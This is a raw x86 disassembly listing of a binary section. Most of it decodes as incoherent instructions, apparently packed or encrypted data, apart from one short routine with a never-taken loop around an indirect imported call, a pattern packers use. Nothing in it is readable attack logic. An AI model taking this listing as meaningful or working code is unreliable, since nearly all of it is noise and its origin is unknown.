  415a7f:	sub    ch,BYTE PTR [edi-0x14]
  415a82:	mov    dh,0xa6
  415a84:	adc    eax,0x356ea781
  415a89:	mov    edx,ebp
  415a8b:	cmp    ch,0xef
  415a8e:	sub    al,0x87
  415a90:	ret    
  415a91:	out    dx,eax
  415a92:	pop    edx
  415a93:	not    DWORD PTR [edi]
  415a95:	sub    BYTE PTR [ecx+ecx*4+0x610abdf0],al
  415a9c:	push   ds
  415a9d:	sbb    BYTE PTR [ebp+0x38b2e5b9],ah
  415aa3:	mov    ch,0x86
  415aa5:	mov    esi,0x78909a81
  415aaa:	jecxz  0x415a4b
  415aac:	ins    DWORD PTR es:[edi],dx
  415aad:	les    ebx,FWORD PTR [edx]
  415aaf:	ret    
  415ab0:	test   al,0xc0
  415ab2:	pop    esp
  415ab3:	shl    cl,cl
  415ab5:	fdiv   st,st(0)
  415ab7:	pop    ds
  415ab8:	(bad)  
  415ab9:	test   ch,0x54
  415abc:	xchg   esp,eax
  415abd:	dec    esi
  415abe:	cmp    al,0x62
  415ac0:	push   ebx
  415ac1:	jne    0x415b33
  415ac3:	dec    esp
  415ac4:	mov    eax,0x7e4ac8bb
  415ac9:	or     al,0xcd
  415acb:	mov    ebx,0x66024c7e
  415ad0:	inc    BYTE PTR [ebx]
  415ad2:	out    0xab,al
  415ad4:	adc    eax,0x47643f56
  415ad9:	mov    dh,BYTE PTR [eax]
  415adb:	iret   
  415adc:	jecxz  0x415a76
  415ade:	pushf  
  415adf:	sub    al,0xf8
  415ae1:	and    DWORD PTR [edi+0x1f],0x65
  415ae5:	dec    ecx
  415ae6:	or     bl,BYTE PTR [esi+eiz*8+0x5c]
  415aea:	fnstenv [ecx-0x6b]
  415aed:	jb     0x415b55
  415aef:	cmp    DWORD PTR [eax],esi
  415af1:	mov    al,dh
  415af3:	pop    eax
  415af4:	push   edi
  415af5:	pop    ecx
  415af6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415af7:	sti    
  415af8:	sbb    dh,bh
  415afa:	push   0x14602448
  415aff:	inc    esi
  415b00:	mov    bh,0xed
  415b02:	add    eax,0xc5ad8b07
  415b07:	mov    dh,ah
  415b09:	push   0x31
  415b0b:	jno    0x415b4b
  415b0d:	pop    esp
  415b0e:	inc    DWORD PTR [edi]
  415b10:	enter  0xb06b,0x42
  415b14:	test   BYTE PTR [edx],cl
  415b16:	test   BYTE PTR [ebx+edi*8-0xeb96450],0x52
  415b1e:	sub    eax,ebp
  415b20:	jae    0x415b04
  415b22:	push   0xef96c268
  415b27:	jp     0x415acc
  415b29:	and    esi,DWORD PTR [ebx-0x29456989]
  415b2f:	push   ds
  415b30:	mov    ch,BYTE PTR ds:0xd197506e
  415b36:	sbb    BYTE PTR ss:[ebx-0x29ccf3ab],cl
  415b3d:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  415b44:	mov    eax,DWORD PTR [ebp+0xc]
  415b47:	xor    eax,esi
  415b49:	add    eax,edi
  415b4b:	pop    edi
  415b4c:	pop    esi
  415b4d:	pop    ebx
  415b4e:	leave  
  415b4f:	ret    0x8
  415b52:	push   ebp
  415b53:	mov    ebp,esp
  415b55:	push   ecx
  415b56:	and    DWORD PTR ds:0x42701c,0x0
  415b60:	jmp    0x415b70
  415b65:	mov    eax,ds:0x42701c
  415b6a:	inc    eax
  415b6b:	mov    ds:0x42701c,eax
  415b70:	cmp    DWORD PTR ds:0x42701c,0x1b
  415b77:	jae    0x415bbd
  415b7d:	cmp    DWORD PTR ds:0x42701c,0x25
  415b84:	jne    0x415bb8
  415b8a:	push   0x5668
  415b8f:	push   DWORD PTR [ebp-0x24]
  415b92:	push   DWORD PTR [ebp-0x10]
  415b95:	push   DWORD PTR [ebp-0x20]
  415b98:	push   0x7cb6
  415b9d:	push   DWORD PTR [ebp-0x24]
  415ba0:	push   0x559a
  415ba5:	push   0x4b12
  415baa:	push   0x6519
  415baf:	push   DWORD PTR [ebp-0x28]
  415bb2:	call   DWORD PTR ds:0x421030
  415bb8:	jmp    0x415b65
  415bbd:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  415bc4:	adc    DWORD PTR ds:0x428008,ecx
  415bca:	mov    eax,DWORD PTR [ebp+0x8]
  415bcd:	add    DWORD PTR ds:0x425010,0x223f
  415bd7:	jmp    0x417f24
  415bdc:	into   
  415bdd:	or     al,0x6c
  415bdf:	jg     0x415c4d
  415be1:	fild   QWORD PTR [ebp-0x75]
  415be4:	dec    ebx
  415be5:	mov    ebp,0xb03718bc
  415bea:	lods   eax,DWORD PTR ds:[esi]
  415beb:	xor    eax,0x6261470d
  415bf0:	push   edx
  415bf1:	pop    edi
  415bf2:	bound  esp,QWORD PTR [edx+0x56]
  415bf5:	mov    ds:0x7eef7af5,al
  415bfa:	rol    esp,cl
  415bfc:	fild   DWORD PTR [ebp+ebx*8-0x341d1272]
  415c03:	mov    ds:0x5c59eb6,eax
  415c08:	sbb    esi,edi
  415c0a:	leave  
  415c0b:	(bad)  
  415c0c:	mov    bh,0xc4
  415c0e:	jo     0x415bf6
  415c10:	xor    bl,ch
  415c12:	ret    
  415c13:	cmp    esp,ebx
  415c15:	out    dx,al
  415c16:	sti    
  415c17:	or     DWORD PTR [esi+edx*1-0x5750ef5f],0x7a
  415c1f:	es sar ah,1
  415c22:	shr    DWORD PTR [ebx+ebx*2-0x18bb4473],1
  415c29:	test   BYTE PTR [esi+ebx*1],0x58
  415c2d:	xchg   esp,eax
  415c2e:	inc    edx
  415c2f:	int3   
  415c30:	test   al,0x42
  415c32:	push   ebp
  415c33:	in     eax,dx
  415c34:	inc    ebx
  415c35:	cli    
  415c36:	push   0xffffffde
  415c38:	pusha  
  415c39:	ds pop ds
  415c3b:	das    
  415c3c:	or     BYTE PTR ds:0xaf07255a,al
  415c42:	mov    ebx,0x3dd2c3bb
  415c47:	or     BYTE PTR [ebp+0x66c5e010],ch
  415c4d:	dec    eax
  415c4e:	add    DWORD PTR [ecx],edi
  415c50:	ins    DWORD PTR es:[edi],dx
  415c51:	inc    ebp
  415c52:	out    0x63,eax
  415c54:	push   edx
  415c55:	sti    
  415c56:	mov    DWORD PTR [eax-0x41],esi
  415c59:	cld    
  415c5a:	dec    ecx
  415c5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c5c:	ins    BYTE PTR es:[edi],dx
  415c5d:	lea    ebp,[edx-0x3858dd7f]
  415c63:	hlt    
  415c64:	xlat   BYTE PTR ds:[ebx]
  415c65:	loope  0x415cb7
  415c67:	dec    edi
  415c68:	jg     0x415c60
  415c6a:	jns    0x415c06
  415c6c:	jo     0x415cec
  415c6e:	ja     0x415c8b
  415c70:	xchg   ebp,eax
  415c71:	fs call 0xe6f8a68f
  415c77:	(bad)  [ebp-0x19e26b22]
  415c7d:	mov    eax,ds:0x5be7cd0d
  415c82:	or     eax,0xc235917b
  415c87:	push   ds
  415c88:	cwde   
  415c89:	sbb    eax,0x443a0fe3
  415c8e:	out    0xec,eax
  415c90:	mov    esp,?
  415c92:	imul   esp,DWORD PTR [ebx+0x2d2b9b94],0x1f
  415c99:	pop    ds
  415c9a:	add    DWORD PTR [edi+0x1c],edx
  415c9d:	cmp    BYTE PTR [edx+0x43],dl
  415ca0:	test   DWORD PTR [eax+esi*8-0x55],0x284e8e16
  415ca8:	dec    edi
  415ca9:	(bad)  
  415caa:	fcomp  QWORD PTR [esi+0x6b698193]
  415cb0:	js     0x415c90
  415cb2:	pop    eax
  415cb3:	cli    
  415cb4:	std    
  415cb5:	and    DWORD PTR [edx],edi
  415cb7:	push   ecx
  415cb8:	mov    BYTE PTR [ebx+eiz*8],0xf
  415cbc:	cmc    
  415cbd:	idiv   ah
  415cbf:	mov    edx,ds
  415cc1:	sbb    ch,BYTE PTR [ebx-0x14890ee0]
  415cc7:	and    BYTE PTR [edi],ah
  415cc9:	out    0x72,eax
  415ccb:	jo     0x415ced
  415ccd:	fwait
  415cce:	dec    ebx
  415ccf:	push   eax
  415cd0:	or     DWORD PTR [edx+0x96dc476],ebp
  415cd6:	test   al,0x1c
  415cd8:	push   edx
  415cd9:	xchg   ebx,eax
  415cda:	pop    edx
  415cdb:	wbinvd 
  415cdd:	mov    cl,0x88
  415cdf:	push   esp
  415ce0:	fist   WORD PTR [edi-0x5933372f]
  415ce6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ce7:	mov    esi,0x6ab8b4a4
  415cec:	mov    DWORD PTR [edi+ebx*1+0x32],0x515f1ab1
  415cf4:	call   0xbad0:0xaa56882e
  415cfb:	mov    edx,0x2f4dc069
  415d00:	loop   0x415d6b
  415d02:	mov    bh,0x19
  415d04:	cmp    BYTE PTR [edx],ch
  415d06:	mov    dl,0xfa
  415d08:	test   al,0x5c
  415d0a:	mov    al,ds:0x7d3a3b9f
  415d0f:	adc    DWORD PTR [edi-0x61],esp
  415d12:	jbe    0x415d1f
  415d14:	js     0x415d35
  415d16:	mov    dl,0xd6
  415d18:	adc    dh,BYTE PTR [esi+0x64]
  415d1b:	ret    0x2032
  415d1e:	pop    edi
  415d1f:	aas    
  415d20:	cmp    eax,0x80a938b9
  415d25:	dec    ebx
  415d26:	add    eax,DWORD PTR [ebp+0x5f9f4e77]
  415d2c:	xchg   esp,eax
  415d2d:	lahf   
  415d2e:	ret    0x9337
  415d31:	mov    ebp,0xd074b480
  415d36:	std    
  415d37:	mov    edi,ebx
  415d39:	repz adc BYTE PTR [ecx+0x237aca76],0x2f
  415d41:	pop    ebx
  415d42:	xchg   ebp,eax
  415d43:	jbe    0x415cd1
  415d45:	cwde   
  415d46:	(bad)  
  415d47:	ins    BYTE PTR es:[edi],dx
  415d48:	push   eax
  415d49:	dec    eax
  415d4a:	stc    
  415d4b:	out    dx,eax
  415d4c:	and    BYTE PTR [ecx+ebp*8-0x4b],0x3a
  415d51:	mov    eax,ds:0xbb40c67c
  415d56:	arpl   WORD PTR [ebx-0x20],bp
  415d59:	test   eax,0x65631063
  415d5e:	push   ebp
  415d5f:	jl     0x415d23
  415d61:	popa   
  415d62:	adc    DWORD PTR [eax+0x664ce8ef],edi
  415d68:	ret    0xc80b
  415d6b:	rol    BYTE PTR [ebx+0x4c],0xc7
  415d6f:	repnz (bad) 
  415d72:	retf   
  415d73:	jnp    0x415d10
  415d75:	xchg   edi,eax
  415d76:	jae    0x415d55
  415d78:	jne    0x415dc1
  415d7a:	sub    al,0x31
  415d7c:	add    ebp,ecx
  415d7e:	sahf   
  415d7f:	jl     0x415da8
  415d81:	jl     0x415d9d
  415d83:	in     al,0x81
  415d85:	stos   BYTE PTR es:[edi],al
  415d86:	push   ebx
  415d87:	mov    WORD PTR [eax+ecx*2-0x575540ab],ss
  415d8e:	add    eax,0x532b0e93
  415d93:	xor    edx,DWORD PTR [edi-0x6f]
  415d96:	xor    ah,cl
  415d98:	fnstenv [ebx+eax*8]
  415d9b:	add    eax,0x961918f5
  415da0:	in     eax,dx
  415da1:	mov    dh,0xc3
  415da3:	mov    edx,0x41f1032f
  415da8:	lock out dx,al
  415daa:	add    bl,BYTE PTR [eax]
  415dac:	dec    ebx
  415dad:	pop    ebx
  415dae:	lods   eax,DWORD PTR ds:[esi]
  415daf:	sbb    al,0x4c
  415db1:	aaa    
  415db2:	ficom  WORD PTR [eax+esi*4-0x71]
  415db6:	enter  0x1066,0x74
  415dba:	jae    0x415e07
  415dbc:	test   DWORD PTR [ebp+0x40e872d0],ebx
  415dc2:	das    
  415dc3:	xchg   esi,eax
  415dc4:	(bad)  
  415dc5:	int    0xb9
  415dc7:	iret   
  415dc8:	sbb    edi,DWORD PTR [esi]
  415dca:	xor    DWORD PTR [ecx-0x9553d7b],ebx
  415dd0:	sbb    BYTE PTR [edx-0x3d455e91],0x1d
  415dd7:	pop    ss
  415dd8:	gs stos BYTE PTR es:[edi],al
  415dda:	das    
  415ddb:	or     bh,ah
  415ddd:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  415ddf:	out    0x8f,al
  415de1:	(bad)  
  415de3:	jo     0x415d67
  415de5:	jmp    0x62e3c894
  415dea:	mov    cs,WORD PTR [ecx]
  415dec:	enter  0xec86,0x86
  415df0:	sub    eax,0x94edc672
  415df5:	scas   eax,DWORD PTR es:[edi]
  415df6:	sti    
  415df7:	mov    esi,0x1d1c7179
  415dfc:	sub    al,0xd6
  415dfe:	jbe    0x415e75
  415e00:	loope  0x415db4
  415e02:	icebp  
  415e03:	arpl   WORD PTR [edi-0x47f064d0],ax
  415e09:	or     DWORD PTR [edi-0x6856a5fe],ebx
  415e0f:	jne    0x415e64
  415e11:	add    al,cl
  415e13:	jns    0x415dd5
  415e15:	dec    edi
  415e16:	ffreep st(6)
  415e18:	add    DWORD PTR [eax],ecx
  415e1a:	mov    cl,0x82
  415e1c:	(bad)  
  415e1d:	sub    BYTE PTR [esi],dh
  415e1f:	arpl   dx,sp
  415e21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e22:	mov    bh,BYTE PTR [eax-0x3f8459c9]
  415e28:	inc    edx
  415e29:	test   al,0x74
  415e2b:	sbb    DWORD PTR [ecx+0x69],0xffffff8d
  415e2f:	pop    es
  415e30:	xchg   DWORD PTR ds:0x6e374203,edi
  415e36:	sbb    eax,0xb7c5b438
  415e3b:	add    al,0x98
  415e3d:	les    ecx,FWORD PTR [ebx]
  415e3f:	and    al,0x79
  415e41:	imul   esi,DWORD PTR [edi],0x8526d22a
  415e47:	clc    
  415e48:	dec    esp
  415e49:	pop    es
  415e4a:	push   ebx
  415e4b:	jmp    FWORD PTR [eax+0x1b7a3e69]
  415e51:	hlt    
  415e52:	push   0x58
  415e54:	int    0x79
  415e56:	out    0xfe,eax
  415e58:	push   ecx
  415e59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e5a:	jge    0x415deb
  415e5c:	pop    ebx
  415e5d:	ret    
  415e5e:	std    
  415e5f:	pop    ecx
  415e60:	pop    esi
  415e61:	pop    esp
  415e62:	or     BYTE PTR [eax],ah
  415e64:	adc    edi,ebp
  415e66:	jns    0x415e34
  415e68:	(bad)  
  415e69:	(bad)  
  415e6a:	retf   
  415e6b:	add    dl,BYTE PTR [ecx+0x64d179cc]
  415e71:	and    eax,ebx
  415e73:	adc    BYTE PTR [ebp+0x73],bl
  415e76:	jg     0x415e24
  415e78:	stos   DWORD PTR es:[edi],eax
  415e79:	stc    
  415e7a:	icebp  
  415e7b:	das    
  415e7c:	push   ebx
  415e7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e7e:	mul    esp
  415e80:	fwait
  415e81:	ss push eax
  415e83:	repz mov bh,BYTE PTR [bp+si]
  415e87:	pop    edi
  415e88:	push   ecx
  415e89:	jmp    0x415e58
  415e8b:	pop    ebx
  415e8c:	mov    ebp,0x18a76bfc
  415e91:	cli    
  415e92:	mov    dh,0x82
  415e94:	fs lahf 
  415e96:	(bad)  
  415e97:	adc    ecx,DWORD PTR [ebx]
  415e99:	dec    ebp
  415e9a:	push   0x9f763e38
  415e9f:	pusha  
  415ea0:	jp     0x415e25
  415ea2:	arpl   ax,dx
  415ea4:	ins    DWORD PTR es:[edi],dx
  415ea5:	add    BYTE PTR [esi+0x212da888],dl
  415eab:	pop    ecx
  415eac:	mov    ch,cl
  415eae:	cld    
  415eaf:	into   
  415eb0:	mov    ds:0xb19e4fa8,eax
  415eb5:	leave  
  415eb6:	xchg   edx,eax
  415eb7:	pop    ecx
  415eb8:	leave  
  415eb9:	mov    al,ds:0x2ea1f871
  415ebe:	nop
  415ebf:	sbb    DWORD PTR [esi+0x42c3bd6d],esi
  415ec5:	call   0x217d3d63
  415eca:	xchg   edi,ecx
  415ecc:	bound  ebp,QWORD PTR [edi+0x5c1c6bb9]
  415ed2:	jmp    0x5b5a28f0
  415ed7:	push   edx
  415ed8:	pop    edi
  415ed9:	mov    esi,0xe0fed1f
  415ede:	mov    esi,0x7d9d73c0
  415ee3:	cmp    eax,DWORD PTR [edx]
  415ee5:	out    dx,al
  415ee6:	mov    ah,0xc1
  415ee8:	dec    esp
  415ee9:	push   edx
  415eea:	out    0x7,al
  415eec:	ret    0x5f39
  415eef:	xchg   esp,eax
  415ef0:	xchg   cl,ah
  415ef2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ef3:	sbb    eax,0x74229c33
  415ef8:	dec    edi
  415ef9:	mov    bl,0x4b
  415efb:	test   DWORD PTR [edi+edx*1],edx
  415efe:	std    
  415eff:	or     BYTE PTR [edx-0x78a61b64],0x11
  415f06:	pusha  
  415f07:	and    DWORD PTR [eax],edi
  415f09:	fnstsw WORD PTR [esi+0x13]
  415f0c:	shl    BYTE PTR [edi],1
  415f0e:	nop
  415f0f:	and    eax,0x1ef7b13
  415f14:	(bad)  
  415f15:	add    BYTE PTR [edx],bh
  415f17:	in     al,dx
  415f18:	push   ebp
  415f19:	xchg   BYTE PTR [ebx-0x61],bh
  415f1c:	rol    DWORD PTR [ecx-0x5f704ecc],cl
  415f22:	push   es
  415f23:	inc    edx
  415f24:	es jae 0x415ee6
  415f27:	mov    bh,0xa7
  415f29:	xchg   ecx,eax
  415f2a:	mov    ah,dl
  415f2c:	or     al,0x82
  415f2e:	xor    eax,0x1a2c50d4
  415f33:	in     eax,0x5e
  415f35:	cdq    
  415f36:	enter  0xfb6b,0x1
  415f3a:	adc    bh,bh
  415f3c:	stos   DWORD PTR es:[edi],eax
  415f3d:	dec    esp
  415f3e:	fs test al,0x31
  415f41:	inc    ebx
  415f42:	mov    ebx,0x68731b61
  415f47:	add    ebp,DWORD PTR [esp+ebp*2+0x1c]
  415f4b:	call   DWORD PTR [ecx]
  415f4d:	add    ebx,esp
  415f4f:	arpl   bp,si
  415f51:	or     eax,0x1ad19250
  415f56:	inc    edi
  415f57:	pusha  
  415f58:	(bad)  [ecx]
  415f5a:	leave  
  415f5b:	(bad)  
  415f5c:	xchg   esp,eax
  415f5d:	jnp    0x415f6b
  415f5f:	fsub   st(4),st
  415f61:	xchg   ebx,eax
  415f62:	xchg   ecx,eax
  415f63:	mov    ds:0x5c9857c6,al
  415f68:	pusha  
  415f69:	xchg   DWORD PTR [edi-0x2a61ccb6],ebx
  415f6f:	test   ebx,0xe303a453
  415f75:	hlt    
  415f76:	sub    bh,dh
  415f78:	retf   
  415f79:	jb     0x415eff
  415f7b:	lods   al,BYTE PTR ds:[esi]
  415f7c:	call   0x784:0x70a8bf25
  415f83:	jge    0x415fdb
  415f85:	fsubr  QWORD PTR [edx+0x743b5cba]
  415f8b:	xor    DWORD PTR [ebx+0x4d8f08c5],ebp
  415f91:	ins    BYTE PTR es:[edi],dx
  415f92:	mov    ch,0xb4
  415f94:	dec    ebx
  415f95:	call   0x43600720
  415f9a:	out    dx,eax
  415f9b:	and    esi,DWORD PTR [eax+0x4f]
  415f9e:	call   0x6928db42
  415fa3:	push   es
  415fa4:	ds dec ecx
  415fa6:	daa    
  415fa7:	popa   
  415fa8:	xor    DWORD PTR [ebx],esi
  415faa:	dec    ebx
  415fab:	pop    eax
  415fac:	jns    0x415fd8
  415fae:	lods   eax,DWORD PTR ds:[esi]
  415faf:	cmp    ah,BYTE PTR [edx-0x1641000d]
  415fb5:	rcr    eax,cl
  415fb7:	rol    BYTE PTR [esi+0x79d5e37d],0x9a
  415fbe:	addr16 mov fs,ebx
  415fc1:	xchg   DWORD PTR [eax],edi
  415fc3:	or     ebx,DWORD PTR ds:0x6d4363b2
  415fc9:	mov    BYTE PTR [edx+esi*4+0x7eab69b6],ch
  415fd0:	out    0x55,eax
  415fd2:	std    
  415fd3:	cmp    BYTE PTR [esi+0x13147ae],0xbe
  415fda:	sti    
  415fdb:	test   al,0x91
  415fdd:	push   eax
  415fde:	es sub eax,0xda0cb799
  415fe4:	dec    eax
  415fe5:	(bad)  
  415fe6:	stc    
  415fe7:	xchg   BYTE PTR [edi+0x334cfdaa],ah
  415fed:	cmp    DWORD PTR [edx],ebx
  415fef:	pop    es
  415ff0:	adc    eax,0x1e7f6be
  415ff5:	sbb    edi,DWORD PTR [ecx]
  415ff7:	add    BYTE PTR [ebp+0xa427d36],cl
  415ffd:	pop    esi
  415ffe:	xchg   BYTE PTR [ebx-0x514ccedb],bh
  416004:	mov    ch,BYTE PTR [esi]
  416006:	cli    
  416007:	mov    ebx,DWORD PTR [ebp+0x13]
  41600a:	ds or  eax,0xf1cc1e5d
  416010:	sahf   
  416011:	jnp    0x416027
  416013:	mov    eax,0x99a6528e
  416018:	pop    eax
  416019:	mov    cl,0xa0
  41601b:	xbegin 0x7c4f504b
  416021:	mov    eax,0x5ce7da8e
  416026:	and    BYTE PTR [eax-0x1f],bl
  416029:	cdq    
  41602a:	ins    BYTE PTR es:[edi],dx
  41602b:	ds jmp 0x4221:0x87381526
  416033:	stos   DWORD PTR es:[edi],eax
  416034:	sti    
  416035:	pushf  
  416036:	stos   BYTE PTR es:[edi],al
  416037:	cwde   
  416038:	cmp    ch,bh
  41603a:	jmp    0x8af0:0x42a8c287
  416041:	adc    edx,DWORD PTR [ebp-0x13]
  416044:	(bad)  
  416045:	pop    ds
  416046:	mov    ch,0x42
  416048:	aaa    
  416049:	mov    ah,0xfa
  41604b:	jo     0x4160cc
  41604d:	or     al,BYTE PTR [eax-0x318998be]
  416053:	lock lods eax,DWORD PTR ds:[esi]
  416055:	push   ebp
  416056:	scas   al,BYTE PTR es:[edi]
  416057:	adc    eax,0x8e896e1f
  41605c:	in     al,dx
  41605d:	inc    esp
  41605e:	mov    ch,0x81
  416060:	jnp    0x4160a0
  416062:	pop    ecx
  416063:	aas    
  416064:	addr16 push esi
  416066:	neg    ebp
  416068:	mov    esp,DWORD PTR [esp+edi*4-0x6]
  41606c:	pshufw mm2,QWORD PTR [esi+ecx*8],0x4c
  416071:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416072:	mov    ebx,ecx
  416074:	in     al,0x12
  416076:	sbb    ch,BYTE PTR [ecx]
  416078:	enter  0x30bb,0x95
  41607c:	sahf   
  41607d:	daa    
  41607e:	fwait
  41607f:	scas   al,BYTE PTR es:[edi]
  416080:	pushf  
  416081:	mov    esi,0xc4608906
  416086:	mov    al,BYTE PTR [ebp+0x323fb55e]
  41608c:	cmp    esi,DWORD PTR ss:[edx]
  41608f:	cdq    
  416090:	add    BYTE PTR [ebx+0x32f475f7],ch
  416096:	xchg   edx,eax
  416097:	or     eax,0x3f1abaa6
  41609c:	push   edx
  41609d:	fisub  WORD PTR [esi+edi*1-0x4488531e]
  4160a4:	pop    es
  4160a5:	adc    dh,bl
  4160a7:	int3   
  4160a8:	div    DWORD PTR [ebx+0x23]
  4160ab:	popa   
  4160ac:	cmp    ebx,ebp
  4160ae:	inc    eax
  4160af:	test   BYTE PTR [esi-0x3e],dh
  4160b2:	call   DWORD PTR [ebp-0x2644a31]
  4160b8:	jmp    0x4160e6
  4160ba:	scas   al,BYTE PTR es:[edi]
  4160bb:	xor    ebx,DWORD PTR [edi+edi*4+0x72ed4d66]
  4160c2:	inc    ebp
  4160c3:	jo     0x4160f2
  4160c5:	sub    cl,BYTE PTR [eax+0x7e655fcc]
  4160cb:	sbb    DWORD PTR [ebx+0x3d5c1a77],eax
  4160d1:	test   DWORD PTR [esi],edx
  4160d3:	xor    edi,eax
  4160d5:	dec    ebx
  4160d6:	fcmove st,st(7)
  4160d8:	xchg   BYTE PTR [eax],cl
  4160da:	lahf   
  4160db:	jg     0x4160c5
  4160dd:	scas   al,BYTE PTR es:[edi]
  4160de:	ror    ebp,0x6e
  4160e1:	add    al,0xc9
  4160e3:	test   eax,0x8cc98e71
  4160e8:	fs jbe 0x4160b6
  4160eb:	addr16 pop ebp
  4160ed:	mov    ?,WORD PTR [esp+eax*2+0x6]
  4160f1:	daa    
  4160f2:	jbe    0x416088
  4160f4:	jb     0x41611c
  4160f6:	mov    ah,0x88
  4160f8:	or     al,0x8e
  4160fa:	and    esp,DWORD PTR [edi-0x3ab7e08e]
  416100:	pop    esp
  416101:	lock sahf 
  416103:	repz cs int3 
  416106:	fucom  st(3)
  416108:	mov    esi,0x647f0c3e
  41610d:	pusha  
  41610e:	or     al,0x4d
  416110:	mov    ah,0x8f
  416112:	std    
  416113:	pop    edx
  416114:	cmc    
  416115:	lods   eax,DWORD PTR ds:[esi]
  416116:	jmp    0x41617d
  416118:	mov    ds:0xa19f8747,al
  41611d:	adc    BYTE PTR [ebp-0x7e],dh
  416120:	shr    BYTE PTR ds:0x78a41b34,0x7a
  416127:	fstp   DWORD PTR [eax]
  416129:	icebp  
  41612a:	sub    esp,DWORD PTR [ecx-0x44]
  41612d:	jg     0x41615c
  41612f:	icebp  
  416130:	in     al,dx
  416131:	out    0x43,eax
  416133:	arpl   WORD PTR [esi+edi*4-0x5a],sp
  416137:	lock sub bh,BYTE PTR [ebx+0x1e]
  41613b:	mov    ebx,ebp
  41613d:	lea    ecx,[ebx+0x723e1044]
  416143:	icebp  
  416144:	dec    ebp
  416145:	xchg   ebx,eax
  416146:	inc    esi
  416147:	cmovo  esi,ebp
  41614a:	(bad)  
  41614c:	mov    al,0xb4
  41614e:	mov    eax,ds:0xfdea5e2a
  416153:	(bad)  
  416154:	cli    
  416155:	jmp    0x13b93990
  41615a:	in     eax,dx
  41615b:	clc    
  41615c:	add    eax,0x8206a092
  416161:	jmp    0x416165
  416163:	fcmovbe st,st(0)
  416165:	pop    esi
  416166:	rcl    BYTE PTR [eax+edx*1+0x4a6a1568],0x6c
  41616e:	and    esp,eax
  416170:	outs   dx,BYTE PTR ds:[esi]
  416171:	or     al,0x38
  416173:	xchg   ebx,eax
  416174:	push   0xaaf56c1b
  416179:	cdq    
  41617a:	test   eax,0xaf814913
  41617f:	sbb    eax,0xddeb3d3f
  416184:	cmp    eax,0xea11fc31
  416189:	mov    WORD PTR [ebx-0x70],gs
  41618c:	pop    ebp
  41618d:	sub    DWORD PTR [edi+0x3f],edx
  416190:	(bad)  
  416191:	fisttp WORD PTR [eax]
  416193:	cmp    DWORD PTR [ebp-0x2b],ebx
  416196:	xor    ch,dl
  416198:	add    al,0xe9
  41619a:	jmp    0x2fabfa32
  41619f:	jecxz  0x416212
  4161a1:	jo     0x4161aa
  4161a3:	cmp    DWORD PTR [esi],ebp
  4161a5:	adc    al,0xd1
  4161a7:	sahf   
  4161a8:	mov    ebp,0x2891d452
  4161ad:	fdivr  QWORD PTR [edx+0x1a965aac]
  4161b3:	sub    ah,ah
  4161b5:	iret   
  4161b6:	int    0xbe
  4161b8:	cmp    al,0x5c
  4161ba:	cdq    
  4161bb:	fistp  QWORD PTR [edi-0x4b18c9ee]
  4161c1:	cmp    edx,DWORD PTR [ebx+ecx*2+0x5e76eef4]
  4161c8:	or     al,0xe3
  4161ca:	push   esp
  4161cb:	mov    al,0x2f
  4161cd:	(bad)  
  4161ce:	xchg   esp,eax
  4161cf:	popa   
  4161d0:	pop    ebx
  4161d1:	xchg   DWORD PTR [edi-0x1b668afe],esi
  4161d7:	aad    0x18
  4161d9:	fisub  DWORD PTR [esi-0x6]
  4161dc:	inc    ebx
  4161dd:	icebp  
  4161de:	not    DWORD PTR [edi-0x23]
  4161e1:	test   DWORD PTR [ebp-0x2f],esi
  4161e4:	inc    edi
  4161e5:	add    dh,BYTE PTR ds:0xb4d46b14
  4161eb:	faddp  st(3),st
  4161ed:	xor    esi,ebp
  4161ef:	pop    ss
  4161f0:	repnz (bad) 
  4161f2:	mov    al,0xa9
  4161f4:	push   edi
  4161f5:	pop    esp
  4161f6:	jae    0x4161fa
  4161f8:	inc    BYTE PTR [ebx+0xddd6a93]
  4161fe:	(bad)  
  4161ff:	pop    esp
  416200:	inc    ebp
  416201:	in     al,dx
  416202:	cdq    
  416203:	adc    DWORD PTR [edx-0x2],ecx
  416206:	xor    BYTE PTR [ebx+eax*1],ah
  416209:	mov    BYTE PTR [edx-0x7],bl
  41620c:	aaa    
  41620d:	mov    ch,0x27
  41620f:	in     al,0xc4
  416211:	adc    eax,DWORD PTR [esp+ecx*2-0x5236d93a]
  416218:	sbb    esi,ecx
  41621a:	jmp    0x92be:0xc41a9a85
  416221:	(bad)  
  416222:	paddq  mm1,QWORD PTR [ecx]
  416225:	(bad)  [esi]
  416227:	and    BYTE PTR [edx],bh
  416229:	push   ebx
  41622a:	test   DWORD PTR [ecx+edi*8-0x2d],eax
  41622e:	pop    edx
  41622f:	sub    ecx,DWORD PTR [ebx]
  416231:	jae    0x416241
  416233:	leave  
  416234:	dec    esp
  416235:	ins    DWORD PTR es:[edi],dx
  416236:	and    edi,DWORD PTR [edx+ebx*8-0x18a6bbc]
  41623d:	pop    esi
  41623e:	mov    ah,0x30
  416240:	shl    BYTE PTR [edx],0xf8
  416243:	inc    esp
  416244:	je     0x416220
  416246:	jg     0x416282
  416248:	mov    ds:0x71af8483,eax
  41624d:	test   al,0xa9
  41624f:	daa    
  416250:	in     eax,dx
  416251:	cmp    esi,ecx
  416253:	out    dx,al
  416254:	out    0xcd,al
  416256:	rcr    DWORD PTR [ecx+0x1fed35e8],1
  41625c:	mov    bh,0xe9
  41625e:	mov    cl,0xa3
  416260:	shl    bl,cl
  416262:	inc    eax
  416263:	jmp    0xacd605fe
  416268:	fs in  al,0xca
  41626b:	cmp    DWORD PTR [edx-0x8],ebx
  41626e:	mov    bl,0x6a
  416270:	(bad)  
  416271:	ds call 0x992:0x48b13f2f
  416279:	push   edi
  41627a:	mov    ebx,0x23e2d31d
  41627f:	inc    edx
  416280:	ds push esi
  416282:	and    ch,ah
  416284:	or     BYTE PTR [esi+0x32cf498d],dh
  41628a:	nop
  41628b:	jg     0x41621a
  41628d:	leave  
  41628e:	retf   
  41628f:	mov    cl,BYTE PTR ds:0xd499d432
